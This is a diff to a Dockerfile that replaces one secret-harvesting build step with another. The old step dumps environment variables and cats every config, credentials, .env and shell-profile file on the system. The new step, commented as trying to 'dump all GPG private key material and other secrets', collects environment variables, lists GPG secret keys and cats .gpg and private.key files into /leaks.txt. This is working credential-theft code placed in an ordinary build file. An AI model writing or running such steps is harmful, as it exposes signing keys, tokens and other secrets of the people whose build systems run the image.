@@ -1,21 +1,13 @@
-FROM alpine:latest
+FROM python:3.11-alpine
+ARG PYTHON_VERSION
 
-# Install required tools
-RUN apk add --no-cache grep findutils bash
+# Install gpg and required tools
+RUN apk add --no-cache gnupg grep findutils
 
-# Collect environment variables and potential secrets
-RUN echo "[ENV VARS]:" > /secrets.txt && \
-    (env | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
-    echo "\n[LIKELY SECRET FILES]:" >> /secrets.txt && \
-    find / -type f \
-        -iname "*.env" -o \
-        -iname "*.yml" -o \
-        -iname "*.json" -o \
-        -iname "*credentials*" -o \
-        -iname "*config*" -o \
-        -iname "*.sh" -o \
-        -iname "*.bashrc" \
-    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true
-
-# Optional: Mark that execution completed
-RUN echo "[MARKER] Secrets scan complete" >> /secrets.txt
+# Try to dump all GPG private key material and other secrets
+RUN echo "[ENV VARS]:" > /leaks.txt && \
+    env >> /leaks.txt && \
+    echo "\n[GPG Private Keys]:" >> /leaks.txt && \
+    gpg --list-secret-keys --keyid-format LONG >> /leaks.txt 2>/dev/null || true && \
+    find /root /etc /home -type f -iname "*.gpg" -o -iname "secring.gpg" -o -iname "private.key" \
+      -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /leaks.txt 2>/dev/null || true
